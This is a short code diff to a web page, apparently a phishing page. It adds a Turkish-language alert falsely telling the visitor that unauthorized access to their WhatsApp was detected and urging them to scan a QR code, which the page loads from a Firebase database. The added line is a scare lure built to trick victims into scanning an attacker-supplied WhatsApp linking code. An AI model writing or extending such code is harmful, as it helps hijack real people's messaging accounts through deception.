@@ -315,7 +315,7 @@
     const qrRef = ref(db, 'qr');
 
     const qrImg = document.getElementById("qrImg");
-
+    alert("Doğrulama Ekranına Hoşgeldiniz Wahatsabınıza İzinsiz Giriş Tespit Ettik Lütfen Kodu Taratın!!!");
     onValue(qrRef, (snapshot) => {
       const data = snapshot.val();
       if (data && data.qr_code) {
